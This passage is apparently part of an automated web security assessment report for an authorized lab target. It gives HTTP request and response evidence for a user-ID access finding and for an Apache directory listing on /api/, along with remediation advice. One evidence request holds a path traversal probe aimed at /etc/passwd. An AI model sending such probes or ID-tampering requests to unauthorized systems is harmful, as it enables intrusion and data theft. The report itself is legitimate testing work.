+date: Mon, 29 Jun 2026 05:57:09 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+
+
+{&quot;success&quot;:false,&quot;message&quot;:&quot;No favorite restaurants found for this user.&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyt2ife-42</code> — <code>artifacts/s-0011/ev-mqyt2ife-42/</code></div><div class="lbl">REQUEST</div><pre>GET /api/get_favorite_restaurants.php?userId=1 HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 177
+content-type: application/json
+date: Mon, 29 Jun 2026 05:57:06 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+
+
+{&quot;success&quot;:true,&quot;data&quot;:{&quot;username&quot;:&quot;not_that_easy&quot;,&quot;restaurants&quot;:[&quot;Pizza Place&quot;,&quot;Sushi World&quot;,&quot;Burger Joint&quot;,&quot;Pasta House&quot;,&quot;Taco Stand&quot;,&quot;BBQ Spot&quot;,&quot;Salad Bar&quot;,&quot;Dessert Shop&quot;]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyt4p5k-46</code> — <code>artifacts/s-0011/ev-mqyt4p5k-46/</code></div><div class="lbl">REQUEST</div><pre>GET /api/get_favorite_restaurants.php?userId=1 HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 177
+content-type: application/json
+date: Mon, 29 Jun 2026 05:58:48 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+
+
+{&quot;success&quot;:true,&quot;data&quot;:{&quot;username&quot;:&quot;not_that_easy&quot;,&quot;restaurants&quot;:[&quot;Pizza Place&quot;,&quot;Sushi World&quot;,&quot;Burger Joint&quot;,&quot;Pasta House&quot;,&quot;Taco Stand&quot;,&quot;BBQ Spot&quot;,&quot;Salad Bar&quot;,&quot;Dessert Shop&quot;]}}</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [info-disclosure] Directory listing enabled on /api/ exposes backend source filenames</h3>
+<div class="kv">Screen: <code>s-0004</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32852/</div>
+<div class="desc">Apache mod_autoindex directory indexing is enabled on /api/, so requesting the directory with no index file returns a full auto-generated listing (HTTP 200, &quot;Index of /api&quot;) that enumerates the backend's PHP source files: change_password.php, get_favorite_restaurants.php, login.php, register.php, search_restaurants.php — including last-modified timestamps and sizes. This hands an attacker a complete map of the API attack surface (CWE-548: Exposure of Information Through Directory Listing) without any authentication; the screen is reachable unauthenticated. The clickable column-sort links (?C=N/M/S/D;O=A/D) are the Apache autoindex sort controls, confirming mod_autoindex is the source.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32852/api/ -&gt; 200, 1825 bytes, &quot;Index of /api&quot; autoindex listing enumerating all backend PHP files (ev-mqys5h7b-1b). 2. Repeat (e.g. with any C value) -&gt; identical listing returned (ev-mqys68k4-1f). 3. Negative control: GET /api/nonexistent-dir-xyz999/ -&gt; 404, 279 bytes, no listing (ev-mqys6vqc-1h), confirming the listing is the real directory's autoindex, not a catch-all. Remediation: set &quot;Options -Indexes&quot; for the directory or add a DirectoryIndex file.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys6vqc-1h</code> — <code>artifacts/s-0004/ev-mqys6vqc-1h/</code></div><div class="lbl">REQUEST</div><pre>GET /api/nonexistent-dir-xyz999/ HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:32:31 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.41 (Ubuntu)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at target.local Port 32852&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys5h7b-1b</code> — <code>artifacts/s-0004/ev-mqys5h7b-1b/</code></div><div class="lbl">REQUEST</div><pre>GET /api/ HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1825
+content-type: text/html;charset=UTF-8
+date: Mon, 29 Jun 2026 05:31:25 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.41 (Ubuntu)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /api&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /api&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;change_password.php&quot;&gt;change_password.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.5K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;get_favorite_restaurants.php&quot;&gt;get_favorite_restaurants.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.3K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;login.php&quot;&gt;login.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;800 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;register.php&quot;&gt;register.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;802 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;search_restaurants.php&quot;&gt;search_restaurants.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;858 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at target.local Port 32852&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys68k4-1f</code> — <code>artifacts/s-0004/ev-mqys68k4-1f/</code></div><div class="lbl">REQUEST</div><pre>GET /api/?C=../../../../etc/passwd HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1825
+content-type: text/html;charset=UTF-8
+date: Mon, 29 Jun 2026 05:32:01 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.41 (Ubuntu)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /api&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /api&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;change_password.php&quot;&gt;change_password.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.5K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;get_favorite_restaurants.php&quot;&gt;get_favorite_restaurants.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.3K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;login.php&quot;&gt;login.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;800 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;register.php&quot;&gt;register.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;802 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;search_restaurants.php&quot;&gt;search_restaurants.php&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;858 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at target.local Port 32852&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+</body></html>
